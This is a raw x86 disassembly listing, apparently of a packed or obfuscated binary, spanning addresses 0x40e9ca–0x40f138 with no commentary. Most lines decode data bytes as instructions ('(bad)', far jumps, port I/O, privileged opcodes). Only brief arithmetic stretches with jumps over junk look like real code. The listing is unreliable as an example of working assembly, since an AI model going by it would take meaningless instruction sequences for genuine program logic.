  40e9ca:	inc    edi
  40e9cb:	stos   BYTE PTR es:[edi],al
  40e9cc:	add    DWORD PTR [ebx+edx*1-0x3f],0xbecf7e1b
  40e9d4:	or     BYTE PTR [ebp+0xe690812],0x93
  40e9db:	mov    edi,0xba9ebfce
  40e9e0:	lahf   
  40e9e1:	popf   
  40e9e2:	sbb    eax,0x73cdb028
  40e9e7:	and    BYTE PTR [edx],ah
  40e9e9:	sub    eax,0x9a537d45
  40e9ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e9ef:	mov    eax,0x287c1e96
  40e9f4:	call   0x1698cbf9
  40e9f9:	sbb    eax,0xc1dc4829
  40e9fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9ff:	mov    WORD PTR [edx+0x6cb3b772],ss
  40ea05:	cmp    BYTE PTR [eax+0x50],ch
  40ea08:	xor    dh,dh
  40ea0a:	jl     0x40ea21
  40ea0c:	cmp    dl,bh
  40ea0e:	aam    0xb2
  40ea10:	iret   
  40ea11:	jnp    0x40ea5c
  40ea13:	loope  0x40e9f2
  40ea15:	pusha  
  40ea16:	pushf  
  40ea17:	or     BYTE PTR [ecx-0x4f],dh
  40ea1a:	cmp    ch,BYTE PTR [ebx-0x7813c06b]
  40ea20:	aam    0x31
  40ea22:	enter  0x3869,0x1
  40ea26:	stos   DWORD PTR es:[edi],eax
  40ea27:	mov    eax,ds:0x4883e2cb
  40ea2c:	pop    esi
  40ea2d:	xchg   ebp,eax
  40ea2e:	fsubr  st,st(6)
  40ea30:	xchg   edx,eax
  40ea31:	jmp    0x30dd:0xc4247592
  40ea38:	dec    ebx
  40ea39:	and    bl,BYTE PTR [edx-0x6f]
  40ea3c:	in     eax,dx
  40ea3d:	sub    BYTE PTR [eax+0x43d9386],bl
  40ea43:	mov    esi,0x4757366a
  40ea48:	fstp   DWORD PTR [edi]
  40ea4a:	scas   al,BYTE PTR es:[edi]
  40ea4b:	xor    ebp,esp
  40ea4d:	jg     0x40eaae
  40ea4f:	xchg   ebp,eax
  40ea50:	sbb    bl,BYTE PTR [ecx-0x67]
  40ea53:	idiv   BYTE PTR [ebx-0x63c4785e]
  40ea59:	push   ebx
  40ea5a:	pop    ss
  40ea5b:	or     al,0x9
  40ea5d:	popa   
  40ea5e:	cdq    
  40ea5f:	inc    ecx
  40ea60:	adc    DWORD PTR [ebx-0x9],0x1d
  40ea64:	push   ss
  40ea65:	push   ss
  40ea66:	pop    esp
  40ea67:	mov    bl,0xd7
  40ea69:	push   eax
  40ea6a:	push   es
  40ea6b:	xor    esi,DWORD PTR ds:0x35387e98
  40ea71:	sub    BYTE PTR ds:0x5aaa9a0b,0xff
  40ea78:	adc    DWORD PTR fs:[esi-0x6],ebx
  40ea7c:	dec    ecx
  40ea7d:	dec    ecx
  40ea7e:	dec    edx
  40ea7f:	fistp  DWORD PTR [esi]
  40ea81:	test   al,0x58
  40ea83:	and    BYTE PTR [ecx],0x6c
  40ea86:	iret   
  40ea87:	inc    ebp
  40ea88:	(bad)  
  40ea89:	aad    0x80
  40ea8b:	ins    BYTE PTR es:[edi],dx
  40ea8c:	retf   0xce9b
  40ea8f:	cmc    
  40ea90:	pop    ebp
  40ea91:	mov    esi,0x292d6862
  40ea96:	or     BYTE PTR [edi+0x58c7305],al
  40ea9c:	push   ecx
  40ea9d:	or     DWORD PTR [edi],edx
  40ea9f:	push   ebp
  40eaa0:	in     al,dx
  40eaa1:	dec    ebx
  40eaa2:	xor    edx,edx
  40eaa4:	div    edi
  40eaa6:	mov    edx,DWORD PTR ds:0x422598
  40eaac:	mov    edx,DWORD PTR [edx+0x1d4]
  40eab2:	sub    edx,eax
  40eab4:	mov    eax,DWORD PTR [ebp+0x10]
  40eab7:	mov    al,BYTE PTR [esi+eax*1]
  40eaba:	mov    BYTE PTR [edx+ecx*1-0x1c12],al
  40eac1:	mov    eax,DWORD PTR [ebp-0x1c]
  40eac4:	mov    edx,DWORD PTR [ebp-0x18]
  40eac7:	imul   eax,edx
  40eaca:	mov    edx,DWORD PTR [ebp-0x14]
  40eacd:	imul   eax,eax,0x262b
  40ead3:	or     eax,edx
  40ead5:	mov    edx,DWORD PTR [ebp-0x10]
  40ead8:	or     eax,edx
  40eada:	xor    eax,0x59f6
  40eadf:	jmp    0x40eda3
  40eae4:	sub    BYTE PTR [edi-0x3c],0x71
  40eae8:	pushf  
  40eae9:	sbb    bl,BYTE PTR [edx]
  40eaeb:	pop    edx
  40eaec:	mov    ebp,0xbcaa14b9
  40eaf1:	out    dx,al
  40eaf2:	push   ss
  40eaf3:	stos   BYTE PTR es:[edi],al
  40eaf4:	std    
  40eaf5:	mov    eax,0x14d21818
  40eafa:	sbb    BYTE PTR [eax],bl
  40eafc:	lock mov BYTE PTR [ecx+ebp*1],dl
  40eb00:	jmp    0x1e07:0x73f1a0d7
  40eb07:	cwde   
  40eb08:	jbe    0x40eae1
  40eb0a:	popa   
  40eb0b:	or     dh,BYTE PTR [edi+0x46f7c429]
  40eb11:	push   0x101bbc79
  40eb16:	nop
  40eb17:	popf   
  40eb18:	jbe    0x40eaf5
  40eb1a:	loope  0x40eb6f
  40eb1c:	inc    ecx
  40eb1d:	push   eax
  40eb1e:	scas   al,BYTE PTR es:[edi]
  40eb1f:	pop    edi
  40eb20:	popf   
  40eb21:	(bad)  
  40eb22:	fucomp st(6)
  40eb24:	mov    BYTE PTR [ebx-0x5cfc91bc],dl
  40eb2a:	scas   eax,DWORD PTR es:[edi]
  40eb2b:	sub    dl,bh
  40eb2d:	pop    ecx
  40eb2e:	sar    BYTE PTR [esi-0xa],0x8
  40eb32:	mov    bl,BYTE PTR ds:[ebp-0xb]
  40eb36:	adc    ecx,DWORD PTR ds:0x4769
  40eb3b:	mov    dl,0x31
  40eb3d:	and    DWORD PTR [eax],edx
  40eb3f:	cmp    BYTE PTR [ebx+ebx*1+0x57],dl
  40eb43:	pop    ebx
  40eb44:	(bad)  
  40eb45:	fcom   st(0)
  40eb47:	(bad)  
  40eb48:	and    al,0xc9
  40eb4a:	div    DWORD PTR [edx-0x35]
  40eb4d:	jmp    0xcd1a53af
  40eb52:	mov    al,0x4e
  40eb54:	cs jnp 0x40eb36
  40eb57:	aaa    
  40eb58:	cmp    BYTE PTR [esi],dl
  40eb5a:	dec    edx
  40eb5b:	xchg   edx,eax
  40eb5c:	aaa    
  40eb5d:	push   ecx
  40eb5e:	dec    eax
  40eb5f:	mov    DWORD PTR [edx-0x36],ebx
  40eb62:	mov    al,bh
  40eb64:	das    
  40eb65:	jl     0x40eb8a
  40eb67:	sti    
  40eb68:	push   esi
  40eb69:	or     bl,bl
  40eb6b:	mov    DWORD PTR [ecx+ebx*2+0x63],ebx
  40eb6f:	mov    ch,0x36
  40eb71:	push   esi
  40eb72:	cmp    al,0xc8
  40eb74:	add    eax,0x212ce2b3
  40eb79:	fwait
  40eb7a:	or     eax,0x1bb82192
  40eb7f:	and    dl,BYTE PTR [edx+esi*4-0x6b]
  40eb83:	jnp    0x40ebbb
  40eb85:	push   0xe219b718
  40eb8a:	xchg   ebx,eax
  40eb8b:	shr    esp,1
  40eb8d:	mov    edi,0xa4ad57c2
  40eb92:	shl    DWORD PTR [eax],1
  40eb94:	lahf   
  40eb95:	rol    BYTE PTR [edx+0x6f],1
  40eb98:	fsubrp st(2),st
  40eb9a:	mov    WORD PTR [edx-0x30a1b262],cs
  40eba0:	out    0xe9,eax
  40eba2:	add    DWORD PTR [ebx+0x7ae9d980],edi
  40eba8:	ficomp WORD PTR [ebx+0x73]
  40ebab:	iret   
  40ebac:	enter  0x2d05,0xd
  40ebb0:	jmp    FWORD PTR [edx]
  40ebb2:	mov    edi,0xbf34a50a
  40ebb7:	popa   
  40ebb8:	cmp    ecx,edx
  40ebba:	dec    ecx
  40ebbb:	arpl   dx,bp
  40ebbd:	mov    eax,0xaad9dae8
  40ebc2:	inc    ecx
  40ebc3:	in     al,dx
  40ebc4:	xor    ah,BYTE PTR [ecx-0x2377678]
  40ebca:	(bad)  
  40ebcb:	popa   
  40ebcc:	jmp    0x40ebd0
  40ebce:	fdivr  QWORD PTR [edi]
  40ebd0:	pop    eax
  40ebd1:	(bad)  
  40ebd2:	rcl    BYTE PTR [ebp-0x1e021118],cl
  40ebd8:	adc    BYTE PTR [edx+0x44],ch
  40ebdb:	pop    esp
  40ebdc:	xchg   ecx,eax
  40ebdd:	mov    gs,WORD PTR gs:[esi+0x5064d12f]
  40ebe4:	jl     0x40ebcf
  40ebe6:	push   es
  40ebe7:	push   cs
  40ebe8:	cmp    eax,0x54b54139
  40ebed:	mov    gs,WORD PTR [ebx-0x141f9673]
  40ebf3:	mov    ds:0xdea6fbb1,al
  40ebf8:	pop    edi
  40ebf9:	push   ebx
  40ebfa:	xor    BYTE PTR [ecx],dl
  40ebfc:	xor    bl,dh
  40ebfe:	bsf    esp,DWORD PTR ds:0x7f617982
  40ec05:	pop    ds
  40ec06:	xchg   ebp,eax
  40ec07:	xchg   DWORD PTR [edx+0x27],edi
  40ec0a:	mov    ecx,0xe449f3bc
  40ec0f:	jecxz  0x40ec04
  40ec11:	dec    edx
  40ec12:	mov    cl,0xc5
  40ec14:	sbb    BYTE PTR [eax-0x1d95f313],ah
  40ec1a:	cmc    
  40ec1b:	lock call FWORD PTR [edx]
  40ec1e:	in     eax,0xaf
  40ec20:	adc    BYTE PTR [eax],cl
  40ec22:	enter  0xb764,0x17
  40ec26:	jge    0x40ec65
  40ec28:	pop    ecx
  40ec29:	into   
  40ec2a:	and    eax,0x4b4eb8a2
  40ec2f:	inc    ecx
  40ec30:	pop    eax
  40ec31:	inc    esp
  40ec32:	add    eax,0x4a040900
  40ec37:	loop   0x40ec9a
  40ec39:	ror    DWORD PTR [ecx],cl
  40ec3b:	pop    ss
  40ec3c:	xor    DWORD PTR [edi],eax
  40ec3e:	cld    
  40ec3f:	rcl    BYTE PTR [edx-0x9],0x3
  40ec43:	fcmovne st,st(2)
  40ec45:	adc    bh,ch
  40ec47:	icebp  
  40ec48:	inc    ebx
  40ec49:	ds aad 0x71
  40ec4c:	cmp    eax,0x7fe4141c
  40ec51:	inc    DWORD PTR ds:0x5609e795
  40ec57:	dec    edx
  40ec58:	dec    eax
  40ec59:	jo     0x40ebec
  40ec5b:	jmp    0x40ebff
  40ec5d:	dec    edi
  40ec5e:	dec    edx
  40ec5f:	push   edx
  40ec60:	icebp  
  40ec61:	cli    
  40ec62:	jo     0x40ecbd
  40ec64:	cmp    ecx,ebx
  40ec66:	out    0x86,al
  40ec68:	fmulp  st(0),st
  40ec6a:	cmc    
  40ec6b:	pop    ebp
  40ec6c:	(bad)  
  40ec6d:	fst    QWORD PTR ds:0x62d148aa
  40ec73:	jg     0x40ecdb
  40ec75:	test   al,0x2b
  40ec77:	add    al,0xfe
  40ec79:	mov    dh,0x14
  40ec7b:	xor    DWORD PTR [esi-0x2e],0xf3cc052e
  40ec82:	fldcw  WORD PTR [edx-0x1e]
  40ec85:	xor    al,0x97
  40ec87:	mov    ah,bh
  40ec89:	popf   
  40ec8a:	xchg   ebx,eax
  40ec8b:	adc    BYTE PTR [bp+si],bh
  40ec8e:	xchg   ebp,eax
  40ec8f:	call   0x9c7f:0x874ce4ba
  40ec96:	inc    ebp
  40ec97:	repz das 
  40ec99:	cld    
  40ec9a:	mov    bl,0x5e
  40ec9c:	outs   dx,DWORD PTR ds:[esi]
  40ec9d:	adc    eax,ebx
  40ec9f:	stos   BYTE PTR es:[edi],al
  40eca0:	iret   
  40eca1:	cmp    DWORD PTR [ecx+0x69],ebx
  40eca4:	cmp    DWORD PTR [esi+0x22],edi
  40eca7:	push   0xffffff88
  40eca9:	xchg   edi,eax
  40ecaa:	jns    0x40ed2b
  40ecac:	sub    BYTE PTR [esi],dl
  40ecae:	jmp    0xd047c6b7
  40ecb3:	les    ebp,FWORD PTR [edi-0x1a]
  40ecb6:	stos   DWORD PTR es:[edi],eax
  40ecb7:	ficom  WORD PTR [ecx-0x68]
  40ecba:	xchg   ebp,eax
  40ecbb:	mov    al,0xab
  40ecbd:	xchg   DWORD PTR [eax-0x2bcf6382],edi
  40ecc3:	mov    ebp,0xd751ca4e
  40ecc8:	pop    esp
  40ecc9:	and    BYTE PTR [esi],ch
  40eccb:	push   edx
  40eccc:	jns    0x40ec79
  40ecce:	cwde   
  40eccf:	jbe    0x40eceb
  40ecd1:	mov    bh,0x44
  40ecd3:	gs pop ebp
  40ecd5:	jae    0x40ed38
  40ecd7:	inc    ecx
  40ecd8:	inc    ebx
  40ecd9:	jl     0x40ed40
  40ecdb:	push   esp
  40ecdc:	(bad)  
  40ecdd:	mov    edi,0x7e2fa3f8
  40ece2:	mov    ebx,edx
  40ece4:	mov    esp,0xd0b2c340
  40ece9:	shl    DWORD PTR [edi-0x63],1
  40ecec:	popf   
  40eced:	mov    ebp,0xb4ea5aa7
  40ecf2:	mov    BYTE PTR [ebx+0x2757fcda],ch
  40ecf8:	aam    0xe7
  40ecfa:	aaa    
  40ecfb:	push   cs
  40ecfc:	outs   dx,DWORD PTR ds:[esi]
  40ecfd:	mov    WORD PTR [ebx],?
  40ecff:	mov    edi,0xc5cbd777
  40ed04:	xor    al,0xf4
  40ed06:	retf   
  40ed07:	adc    DWORD PTR [edx+0x646b5676],ecx
  40ed0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ed0e:	or     esp,DWORD PTR [eax]
  40ed10:	cmp    eax,0x37068baa
  40ed15:	add    BYTE PTR [ebp-0x2b],cl
  40ed18:	(bad)  
  40ed19:	stc    
  40ed1a:	inc    esp
  40ed1b:	ret    
  40ed1c:	xor    al,0x3e
  40ed1e:	repnz add esi,DWORD PTR [esi+0x4e5e5f9b]
  40ed25:	push   esp
  40ed26:	test   DWORD PTR [ecx],ecx
  40ed28:	in     al,dx
  40ed29:	mov    esi,0x2c1845d4
  40ed2e:	sub    eax,DWORD PTR ss:[ebp-0x5cf86035]
  40ed35:	xor    eax,0x4d81f406
  40ed3a:	dec    edi
  40ed3b:	sti    
  40ed3c:	pop    edi
  40ed3d:	(bad)  
  40ed3e:	and    eax,0x9cf2e13b
  40ed43:	adc    BYTE PTR [eax-0x5ad22345],dl
  40ed49:	mov    bl,0xbb
  40ed4b:	pushf  
  40ed4c:	and    eax,edx
  40ed4e:	jb     0x40ecd6
  40ed50:	jp     0x40ecfc
  40ed52:	adc    eax,0xeded8024
  40ed57:	(bad)
  40ed5a:	mov    ch,0x5f
  40ed5c:	dec    eax
  40ed5d:	xchg   DWORD PTR [esi+0x7a23ef95],esi
  40ed63:	(bad)  
  40ed64:	jmp    0x9699:0xcb26369a
  40ed6b:	aad    0x9b
  40ed6d:	cmp    al,0x28
  40ed6f:	popf   
  40ed70:	xlat   BYTE PTR ds:[ebx]
  40ed71:	cmp    ch,ah
  40ed73:	push   esi
  40ed74:	cmp    bh,bl
  40ed76:	test   eax,0x936e84d6
  40ed7b:	xor    cl,BYTE PTR [edx+0x3e]
  40ed7e:	dec    BYTE PTR [ecx+0x54]
  40ed81:	data16 fisttp DWORD PTR [ecx+esi*2+0x17896de4]
  40ed89:	iret   
  40ed8a:	sub    al,0x37
  40ed8c:	adc    eax,0x5e
  40ed8f:	cli    
  40ed90:	push   esi
  40ed91:	lds    eax,FWORD PTR cs:[esi+ebx*8-0x2a07cf7d]
  40ed99:	mov    ch,0xa3
  40ed9b:	js     0x40ed49
  40ed9d:	dec    edx
  40ed9e:	js     0x40ee04
  40eda0:	js     0x40ed6f
  40eda2:	xchg   ecx,eax
  40eda3:	lea    ecx,[ecx+eax*1+0x350559e6]
  40edaa:	mov    eax,DWORD PTR [ebp-0xc]
  40edad:	and    eax,0xddc
  40edb2:	add    eax,DWORD PTR [ebp-0x8]
  40edb5:	xor    eax,0x46e3
  40edba:	add    eax,0x50eb
  40edbf:	cmp    ecx,eax
  40edc1:	jmp    0x40f085
  40edc6:	cmp    DWORD PTR [edx-0x25e5f4a4],ecx
  40edcc:	daa    
  40edcd:	sub    ch,BYTE PTR [edx-0x4655ed90]
  40edd3:	jmp    0xb2f89e97
  40edd8:	sbb    BYTE PTR [eax],bl
  40edda:	rcl    BYTE PTR [eax+ebx*1],cl
  40eddd:	sbb    BYTE PTR [ecx+0x1c],al
  40ede0:	mov    ah,0x31
  40ede2:	push   esp
  40ede3:	or     bh,cl
  40ede5:	imul   ebp,DWORD PTR [ecx+0x43f31a10],0xffffffb2
  40edec:	pop    edi
  40eded:	daa    
  40edee:	inc    ecx
  40edef:	sbb    eax,0xdc0779b8
  40edf4:	sahf   
  40edf5:	clc    
  40edf6:	fmul   QWORD PTR [ecx-0x4a]
  40edf9:	das    
  40edfa:	push   ecx
  40edfb:	push   ss
  40edfc:	mov    bh,0xc9
  40edfe:	(bad)  
  40edff:	and    ebx,DWORD PTR [ebx]
  40ee01:	sbb    al,0xbd
  40ee03:	sbb    ebx,esi
  40ee05:	fsub   DWORD PTR [ebx]
  40ee07:	rcr    BYTE PTR [eax],0xa
  40ee0a:	mov    esp,0xb42eaeb8
  40ee0f:	loop   0x40ee75
  40ee11:	fwait
  40ee12:	pop    ds
  40ee13:	sbb    esi,DWORD PTR [edi]
  40ee15:	pop    edi
  40ee16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee17:	test   DWORD PTR [ecx+eiz*4-0x66],esi
  40ee1b:	cmp    DWORD PTR [esp+esi*2],eax
  40ee1e:	sbb    BYTE PTR [ebp-0x79],bl
  40ee21:	test   ch,bh
  40ee23:	popa   
  40ee24:	scas   al,BYTE PTR es:[edi]
  40ee25:	xchg   edx,eax
  40ee26:	mov    edx,0xd0f375ba
  40ee2b:	or     esp,ebx
  40ee2d:	pop    ebp
  40ee2e:	lods   al,BYTE PTR ds:[esi]
  40ee2f:	xor    DWORD PTR [ebp-0x57326cea],esp
  40ee35:	xor    al,al
  40ee37:	fs jmp 0xca0a:0x4c3a97f1
  40ee3f:	in     eax,dx
  40ee40:	cwde   
  40ee41:	loop   0x40eeb8
  40ee43:	add    esp,DWORD PTR [edi+0x547ec3fb]
  40ee49:	and    eax,DWORD PTR [esi+0x496f6433]
  40ee4f:	mov    ch,0x6c
  40ee51:	jb     0x40eec9
  40ee53:	jnp    0x40eed3
  40ee55:	ret    0xfe7
  40ee58:	iret   
  40ee59:	test   eax,0x509c27bb
  40ee5e:	mov    esp,0x1687980f
  40ee63:	stc    
  40ee64:	in     eax,0xba
  40ee66:	fcomp  QWORD PTR [ecx-0x55eae741]
  40ee6c:	ror    DWORD PTR [eax],cl
  40ee6e:	rcr    DWORD PTR [ecx-0x5ba084d],1
  40ee74:	push   ecx
  40ee75:	pop    esp
  40ee76:	sub    esi,DWORD PTR [eax]
  40ee78:	test   eax,0xc568b047
  40ee7d:	fidivr DWORD PTR [ebx+0x18]
  40ee80:	and    eax,0x3f3d94c3
  40ee85:	fstp   DWORD PTR [ebp+0x33]
  40ee88:	pop    es
  40ee89:	xlat   BYTE PTR ds:[ebx]
  40ee8a:	mov    edx,0xad78fd7b
  40ee8f:	push   ecx
  40ee90:	mov    ch,0x3
  40ee92:	aas    
  40ee93:	cwde   
  40ee94:	adc    al,0xdd
  40ee96:	add    BYTE PTR [ecx],dh
  40ee98:	das    
  40ee99:	inc    edi
  40ee9a:	cmc    
  40ee9b:	pop    ebp
  40ee9c:	std    
  40ee9d:	mov    ebp,0x86d87ff7
  40eea2:	sub    BYTE PTR [ecx-0x784dfd89],al
  40eea8:	cmp    al,0x96
  40eeaa:	mov    ebp,DWORD PTR [ecx+ebx*1-0xdf0efcd]
  40eeb1:	ror    ebx,1
  40eeb3:	in     al,0xfe
  40eeb5:	jge    0x40ef32
  40eeb7:	mov    ds:0x391820aa,al
  40eebc:	mov    ecx,esi
  40eebe:	pushf  
  40eebf:	or     cl,0x6e
  40eec2:	jo     0x40ef28
  40eec4:	es pop edi
  40eec6:	jne    0x40ee55
  40eec8:	stos   WORD PTR es:[edi],ax
  40eeca:	call   0xa22fd7f9
  40eecf:	aas    
  40eed0:	out    dx,al
  40eed1:	sar    DWORD PTR [eax-0x60],0x67
  40eed5:	imul   BYTE PTR [ecx+0x54]
  40eed8:	call   0x13d7e7b9
  40eedd:	es ins DWORD PTR es:[edi],dx
  40eedf:	imul   edx,DWORD PTR [esp+ebp*1+0x64b05727],0xd5798c99
  40eeea:	test   eax,0xed78dae5
  40eeef:	ror    DWORD PTR [edx+0x4a82eb62],1
  40eef5:	push   0x42
  40eef7:	fcomp  DWORD PTR [ecx]
  40eef9:	fadd   DWORD PTR [ebp+0x34]
  40eefc:	enter  0xde46,0x35
  40ef00:	je     0x40eeea
  40ef02:	adc    esi,DWORD PTR ds:0xe62c2f2f
  40ef08:	fcmovnbe st,st(1)
  40ef0a:	and    bh,ah
  40ef0c:	sub    DWORD PTR [edx-0x6de51c67],0x6d80e4f8
  40ef16:	inc    esi
  40ef17:	loopne 0x40ef4a
  40ef19:	retf   0x26a9
  40ef1c:	cli    
  40ef1d:	cmp    edx,ebx
  40ef1f:	add    dh,BYTE PTR [eax-0x78]
  40ef22:	cli    
  40ef23:	cld    
  40ef24:	add    DWORD PTR [esi-0x7ba74266],ecx
  40ef2a:	jle    0x40ef6b
  40ef2c:	cdq    
  40ef2d:	cwde   
  40ef2e:	add    cl,BYTE PTR [esi-0x50d6fd25]
  40ef34:	mov    ds:0xcab2bc93,al
  40ef39:	adc    eax,0x2158592a
  40ef3e:	imul   ebx,DWORD PTR [ecx],0xffffffeb
  40ef41:	fidivr WORD PTR [esi-0x7acc228e]
  40ef47:	outs   dx,BYTE PTR ds:[esi]
  40ef48:	sub    al,0x64
  40ef4a:	ins    BYTE PTR es:[edi],dx
  40ef4b:	imul   eax,DWORD PTR [esp+ecx*2],0xbe04a28a
  40ef52:	xor    ah,bh
  40ef54:	lock jbe 0x40ef61
  40ef57:	pop    esp
  40ef58:	or     al,0xa4
  40ef5a:	add    ah,BYTE PTR [esi+0x5d061100]
  40ef60:	cmp    ah,0x79
  40ef63:	dec    edx
  40ef64:	js     0x40ef77
  40ef66:	add    BYTE PTR [esi],dh
  40ef68:	pop    ds
  40ef69:	push   ecx
  40ef6a:	cmp    al,0xc1
  40ef6c:	neg    BYTE PTR [ebx-0x6f99fab1]
  40ef72:	pop    es
  40ef73:	xor    eax,DWORD PTR [ebp-0x75808cc7]
  40ef79:	inc    BYTE PTR [edi+0x3b]
  40ef7c:	into   
  40ef7d:	mov    ebx,0x3765a69f
  40ef82:	aam    0xd5
  40ef84:	and    al,BYTE PTR [ebp+0x28]
  40ef87:	(bad)  
  40ef88:	mov    esi,0x8c8675fd
  40ef8d:	jns    0x40eff2
  40ef8f:	xor    bl,BYTE PTR [eax]
  40ef91:	sbb    ebx,0xffffffed
  40ef94:	sbb    esp,DWORD PTR [ebx]
  40ef96:	jns    0x40efe4
  40ef98:	call   0x802c:0x2870622b
  40ef9f:	cdq    
  40efa0:	and    eax,0x56d607bc
  40efa5:	stc    
  40efa6:	mov    ds:0x7145ba05,eax
  40efab:	add    BYTE PTR [edi-0x2a],0x32
  40efaf:	sub    BYTE PTR [edi],al
  40efb1:	cdq    
  40efb2:	sbb    eax,0xc27b2927
  40efb7:	jne    0x40ef77
  40efb9:	fdiv   QWORD PTR [ebx-0x60]
  40efbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efbd:	ror    DWORD PTR [ecx+0x28],1
  40efc0:	inc    BYTE PTR [eax]
  40efc2:	fsub   DWORD PTR [esi+ecx*4-0x5c]
  40efc6:	fidivr WORD PTR [edi+ecx*1]
  40efc9:	aaa    
  40efca:	into   
  40efcb:	dec    ebx
  40efcc:	jecxz  0x40eff4
  40efce:	mov    cl,0x98
  40efd0:	stc    
  40efd1:	jno    0x40f025
  40efd3:	popf   
  40efd4:	daa    
  40efd5:	push   0x6e684b42
  40efda:	cmc    
  40efdb:	and    al,BYTE PTR [edx]
  40efdd:	pop    esi
  40efde:	scas   eax,DWORD PTR es:[edi]
  40efdf:	cmp    eax,DWORD PTR [esi+0x56]
  40efe2:	test   al,0x55
  40efe4:	stos   BYTE PTR es:[edi],al
  40efe5:	loopne 0x40ef79
  40efe7:	test   edi,0x4a16a612
  40efed:	inc    ebp
  40efee:	push   esi
  40efef:	and    eax,0xabeff545
  40eff4:	sbb    al,ch
  40eff6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eff7:	cmc    
  40eff8:	cmp    al,0x8f
  40effa:	sbb    eax,0x6db2fefa
  40efff:	dec    eax
  40f000:	xchg   esi,eax
  40f001:	mov    ch,0x4e
  40f003:	and    al,0xc9
  40f005:	cmp    al,0x7
  40f007:	ss jmp 0xa620afe8
  40f00d:	xor    BYTE PTR gs:[ebp+0x2b],cl
  40f011:	pop    eax
  40f012:	mov    ds:0x4816a7e,al
  40f017:	test   BYTE PTR [edi],0x3b
  40f01a:	fld    TBYTE PTR [ebx+0x1be77d81]
  40f020:	pop    edi
  40f021:	or     dh,bh
  40f023:	ja     0x40f027
  40f025:	and    al,0x48
  40f027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f028:	fwait
  40f029:	sbb    dh,BYTE PTR ds:0xeba1b00b
  40f02f:	addr16 call 0x8eb7d461
  40f035:	retf   0x7c7a
  40f038:	inc    ebx
  40f039:	inc    esp
  40f03a:	pop    esi
  40f03b:	dec    edx
  40f03c:	lods   al,BYTE PTR ds:[esi]
  40f03d:	fld    st(2)
  40f03f:	je     0x40f06f
  40f041:	lods   eax,DWORD PTR ds:[esi]
  40f042:	adc    ebp,esp
  40f044:	icebp  
  40f045:	pop    ds
  40f046:	nop    DWORD PTR [ebx]
  40f049:	push   edx
  40f04a:	or     al,0x35
  40f04c:	jge    0x40f088
  40f04e:	push   ds
  40f04f:	in     eax,dx
  40f050:	sbb    al,0xc
  40f052:	repnz xchg esi,eax
  40f054:	jmp    0x40f000
  40f056:	adc    al,0xe1
  40f058:	sbb    DWORD PTR [bx],esi
  40f05b:	lods   eax,DWORD PTR ds:[esi]
  40f05c:	jecxz  0x40f010
  40f05e:	mov    ds:0xb6dfbe32,eax
  40f063:	pop    edx
  40f064:	rol    BYTE PTR [ebx+0x18],cl
  40f067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f068:	aad    0x2f
  40f06a:	outs   dx,DWORD PTR ds:[esi]
  40f06b:	pop    ebp
  40f06c:	add    cl,bh
  40f06e:	add    BYTE PTR [esi],cl
  40f070:	cmc    
  40f071:	push   eax
  40f072:	adc    al,BYTE PTR [eax]
  40f074:	stos   BYTE PTR es:[edi],al
  40f075:	sbb    BYTE PTR [edi],ch
  40f077:	fwait
  40f078:	aaa    
  40f079:	sbb    BYTE PTR [eax],bl
  40f07b:	or     BYTE PTR [eax],ah
  40f07d:	icebp  
  40f07e:	ret    
  40f07f:	dec    esp
  40f080:	loop   0x40f04a
  40f082:	ret    
  40f083:	push   eax
  40f084:	ss jne 0x40e793
  40f08b:	pop    edi
  40f08c:	jmp    0x40f350
  40f091:	inc    edi
  40f092:	mov    ds:0x305a70db,al
  40f097:	inc    edx
  40f098:	call   0x39b9:0xaa146552
  40f09f:	loope  0x40f11f
  40f0a1:	jo     0x40f051
  40f0a3:	sbb    BYTE PTR [eax],bl
  40f0a5:	rcl    BYTE PTR [eax+ebx*1],cl
  40f0a8:	sbb    BYTE PTR [edi],bh
  40f0aa:	pop    ebp
  40f0ab:	sub    edi,ecx
  40f0ad:	xlat   BYTE PTR ds:[ebx]
  40f0ae:	cdq    
  40f0af:	mov    bl,0xdb
  40f0b1:	mov    bl,0x9d
  40f0b3:	in     al,dx
  40f0b4:	ficom  DWORD PTR [ebp+0x5dcfcd98]
  40f0ba:	into   
  40f0bb:	aaa    
  40f0bc:	push   cs
  40f0bd:	inc    esi
  40f0be:	retf   0x5e2c
  40f0c1:	icebp  
  40f0c2:	ins    BYTE PTR es:[edi],dx
  40f0c3:	cwde   
  40f0c4:	arpl   sp,cx
  40f0c6:	push   esi
  40f0c7:	push   ecx
  40f0c8:	sbb    ebp,eax
  40f0ca:	aad    0x94
  40f0cc:	fnstcw WORD PTR [ecx]
  40f0ce:	and    al,0x9c
  40f0d0:	pop    ebx
  40f0d1:	xchg   ecx,eax
  40f0d2:	and    DWORD PTR ss:[ecx],0xb421af02
  40f0d9:	sub    edi,ecx
  40f0db:	jb     0x40f0f1
  40f0dd:	(bad)  
  40f0df:	fbld   TBYTE PTR [ecx+0x12c34a73]
  40f0e5:	fiadd  WORD PTR [ebx+eax*1+0x7ffa3157]
  40f0ec:	addr16 add dl,ch
  40f0ef:	shl    ebp,1
  40f0f1:	bound  esi,QWORD PTR [ecx-0x59c22a0e]
  40f0f7:	push   esp
  40f0f8:	and    BYTE PTR [ebx+ebx*2],0xfa
  40f0fc:	cli    
  40f0fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f0fe:	imul   ebx,DWORD PTR [ecx-0x6fc26fa5],0x15
  40f105:	xchg   edi,eax
  40f106:	pop    ecx
  40f107:	test   BYTE PTR [ebx-0x3b],cl
  40f10a:	mov    WORD PTR [ebp-0x17349390],?
  40f110:	push   cs
  40f111:	setae  BYTE PTR [ecx-0x33]
  40f115:	out    0xa9,eax
  40f117:	or     ecx,DWORD PTR [edx+0xa]
  40f11a:	je     0x40f132
  40f11c:	test   eax,0x6852d5db
  40f121:	outs   dx,BYTE PTR ds:[esi]
  40f122:	mov    ebx,0x1cc4dcad
  40f127:	jge    0x40f150
  40f129:	mov    eax,ds:0xc565f7ac
  40f12e:	(bad)  
  40f12f:	dec    edi
  40f130:	and    edi,edx
  40f132:	cmp    BYTE PTR [ebp-0x16161050],ch
  40f138:	dec    esp
